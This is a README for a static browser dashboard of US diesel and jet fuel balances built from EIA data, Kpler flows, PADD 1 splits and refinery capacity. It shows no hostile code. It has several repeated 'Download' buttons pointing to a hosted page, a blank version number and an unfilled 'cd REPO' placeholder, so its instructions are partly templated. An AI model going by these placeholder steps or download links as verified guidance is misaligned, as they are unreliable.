# US Balances - dashboard tools 2026

> **US Balances is a browser-ready static dashboard that packages diesel and jet balance views drawn from EIA data, Kpler context, refinery capacity, and power-generation signals around the current dashboard build.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hannesbennett1984/eia-us-balances-hub?style=flat-square)](https://github.com/hannesbennett1984/eia-us-balances-hub)

---

<p align="center">
  <a href="https://hannesbennett1984.github.io/eia-us-balances-hub/">
    <img src="https://img.shields.io/badge/Download-US%20Balances%20Latest-brightgreen?style=for-the-badge" alt="Download US Balances">
  </a>
</p>

> **[Direct Download - US Balances v](https://hannesbennett1984.github.io/eia-us-balances-hub/)**

---

[Download Latest Build](https://hannesbennett1984.github.io/eia-us-balances-hub/)

---

## What US Balances Is

US Balances ships a static, web-viewable surface for reading diesel and jet balance material. Dashboard assets pull together EIA balance CSVs and related market and supply layers so you can see how those balances are put together and kept current.

It is aimed at anyone who wants a consistent, browser-based pass over monthly and weekly balance products without standing up a full interactive stack. One published layout also lets you set balance signals next to Kpler flow context, PADD 1 splits, refinery capacity, and power-generation DFO context.

---

## What You Get

- Static pages focused on diesel and jet balance review
- EIA balance CSV coverage on monthly and weekly cadences
- Kpler flow context to frame wider supply moves
- PADD 1 splits for regional breakdowns
- Refinery capacity layers to anchor balance interpretation
- Power-generation DFO context on the demand side
- An update path for refreshing dashboard data
- Build scripts that assemble and publish static assets

---

## Installation

Clone the repo or grab the source bundle, then open the dashboard from the published build or your local tree.

git clone https://github.com/hannesbennett1984/eia-us-balances-hub.git
cd REPO

For a generated site, load the static entry file in a browser or place the build output on whatever static host you use.

---

## Usage

Open the published dashboard to work through diesel and jet balance views, then line monthly and weekly outputs up against the linked context layers.

Suggested flow:

1. Load the dashboard in a browser.
2. Scan the newest balance charts and tables.
3. Read EIA results beside Kpler and regional split context.
4. Rebuild after upstream data changes.
5. Push the new static bundle to your host.

Pipeline maintainers should rerun the build scripts once source CSVs are refreshed so the dashboard tracks the latest inputs.

---

## Configuration

Most options live with the dashboard build assets and the refresh pipeline, not in an end-user runtime settings screen.

Places people usually touch:

- Paths to monthly and weekly CSV inputs
- Scripts that regenerate the dashboard
- Directories that receive the static site bundle
- Mappings for Kpler, PADD 1, refinery capacity, and DFO context

Example structure:

{
  "monthly_csv": "path/to/monthly.csv",
  "weekly_csv": "path/to/weekly.csv",
  "output_dir": "dist/",
  "build_script": "npm run build"
}

---

## Requirements

- A web browser to open the static dashboard
- EIA balance CSV outputs
- Supporting inputs for Kpler flows, refinery capacity, and power-generation DFO work
- A build environment when you need to regenerate the dashboard
- Space to hold generated static files and data artifacts

---

## FAQ

**How do updates land?**  
Through the dashboard build workflow and the data refresh pipeline tied to it.

**What feeds the balances?**  
Monthly and weekly EIA balance CSVs, plus context from Kpler, refinery capacity, PADD 1, and power-generation DFO sources.

**Can the layout be customized?**  
Yes. Change build assets, data mappings, or static layout files, then regenerate the site.

**Dashboard looks stale—what first?**  
Verify the source CSVs were updated and that build scripts ran again before you publish.

**Is this a live app?**  
No. It is a static dashboard: output is produced ahead of time and served as files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
